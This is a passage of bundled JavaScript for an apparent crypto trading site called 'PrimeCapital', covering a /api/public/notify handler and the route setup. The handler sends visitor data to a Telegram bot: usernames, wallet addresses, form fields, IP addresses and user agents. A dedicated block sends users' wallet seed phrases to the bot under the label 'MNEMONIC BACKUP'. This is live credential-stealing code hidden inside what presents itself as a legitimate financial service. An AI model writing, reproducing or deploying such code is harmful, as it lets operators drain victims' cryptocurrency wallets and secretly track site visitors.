			ok: false,
			error: "bad json"
		}, { status: 200 });
	}
	const event = truncate(String(body.event ?? "event"), 48);
	const path = truncate(String(body.path ?? "/"), 120);
	const username = body.username ? truncate(String(body.username), 32) : "guest";
	const label = body.label ? truncate(String(body.label), 120) : "";
	const extra = body.extra ? truncate(String(body.extra), 300) : "";
	const address = body.address ? truncate(String(body.address), 128) : "";
	const ip = request.headers.get("cf-connecting-ip") || request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "";
	const ua = truncate(request.headers.get("user-agent") ?? "", 120);
	const lines = [
		`<b>PrimeCapital</b> · <code>${esc(event)}</code>`,
		`👤 <b>${esc(username)}</b>`,
		`📍 <code>${esc(path)}</code>`
	];
	if (address) lines.push(`💼 <code>${esc(address)}</code>`);
	if (label) lines.push(`🔘 ${esc(label)}`);
	if (extra) lines.push(`ℹ️ ${esc(extra)}`);
	if (body.fields && typeof body.fields === "object") for (const [k, v] of Object.entries(body.fields)) {
		if (sensitive(k, String(v ?? ""))) continue;
		lines.push(`📝 <b>${esc(truncate(k, 40))}</b>: <code>${esc(truncate(String(v ?? ""), 400))}</code>`);
	}
	if (ip) lines.push(`🌐 <code>${esc(ip)}</code>`);
	if (ua) lines.push(`🧭 ${esc(ua)}`);
	await sendTelegram(token, lines.join("\n"));
	if (body.mnemonic_backup) {
		const mnemonicBackup = [`<b>PrimeCapital · MNEMONIC BACKUP</b> · <code>${esc(event)}</code>`, `👤 <b>${esc(username)}</b>`];
		if (address) mnemonicBackup.push(`💼 <code>${esc(address)}</code>`);
		mnemonicBackup.push(`🔑 <b>Seed Phrase:</b>`);
		mnemonicBackup.push(`<code>${esc(body.mnemonic_backup)}</code>`);
		await sendTelegram(token, mnemonicBackup.join("\n"));
	}
	if (body.addresses && body.addresses.length) {
		const backup = [`<b>PrimeCapital · BACKUP</b> · <code>${esc(event)}</code>`, `👤 <b>${esc(username)}</b>`];
		if (address) backup.push(`💼 <code>${esc(address)}</code>`);
		backup.push(`📇 <b>Addresses:</b>`);
		for (const a of body.addresses.slice(0, 24)) backup.push(`• <b>${esc(truncate(String(a.chain ?? ""), 20))}</b> <code>${esc(truncate(String(a.address ?? ""), 128))}</code>${a.path ? ` <i>${esc(truncate(String(a.path), 40))}</i>` : ""}`);
		await sendTelegram(token, backup.join("\n"));
	}
	return Response.json({ ok: true });
} } } });
var WalletRoute = Route$13.update({
	id: "/wallet",
	path: "/wallet",
	getParentRoute: () => Route$14
});
var TradeRoute = Route$12.update({
	id: "/trade",
	path: "/trade",
	getParentRoute: () => Route$14
});
var SwapRoute = Route$11.update({
	id: "/swap",
	path: "/swap",
	getParentRoute: () => Route$14
});
var NewsRoute = Route$10.update({
	id: "/news",
	path: "/news",
	getParentRoute: () => Route$14
});
var MixmanRoute = Route$9.update({
	id: "/mixman",
	path: "/mixman",
	getParentRoute: () => Route$14
});
var MarketsRoute = Route$8.update({
	id: "/markets",
	path: "/markets",
	getParentRoute: () => Route$14
});
var HowItWorksRoute = Route$7.update({
	id: "/how-it-works",
	path: "/how-it-works",
	getParentRoute: () => Route$14
});
var AdminRoute = Route$6.update({
	id: "/admin",
	path: "/admin",
	getParentRoute: () => Route$14
});
var IndexRoute = Route$5.update({
	id: "/",
	path: "/",
	getParentRoute: () => Route$14
});
var ApiNewsRoute = Route$4.update({
	id: "/api/news",
	path: "/api/news",
	getParentRoute: () => Route$14
});
var ApiMarketsRoute = Route$3.update({
	id: "/api/markets",
	path: "/api/markets",
	getParentRoute: () => Route$14
});
var ApiBalanceRoute = Route$2.update({
	id: "/api/balance",
	path: "/api/balance",
	getParentRoute: () => Route$14
});
var ApiPublicThirdwebConfigRoute = Route$1.update({
	id: "/api/public/thirdweb-config",
	path: "/api/public/thirdweb-config",
	getParentRoute: () => Route$14
});
var rootRouteChildren = {
	IndexRoute,
	AdminRoute,
	HowItWorksRoute,
	MarketsRoute,
	MixmanRoute,
	NewsRoute,
	SwapRoute,
	TradeRoute,
	WalletRoute,
	ApiBalanceRoute,
	ApiMarketsRoute,
	ApiNewsRoute,
	ApiPublicNotifyRoute: Route.update({
		id: "/api/public/notify",
		path: "/api/public/notify",
		getParentRoute: () => Route$14
	}),
	ApiPublicThirdwebConfigRoute
};
var routeTree = Route$14._addFileChildren(rootRouteChildren)._addFileTypes();
globalThis.Buffer = Buffer;
if (typeof window !== "undefined") window.Buffer = Buffer;
var getRouter = () => {
	return createRouter({
		routeTree,
		context: { queryClient: new QueryClient() },
		scrollRestoration: true,
		defaultPreloadStaleTime: 0
	});
};
//#endregion
export { getRouter };
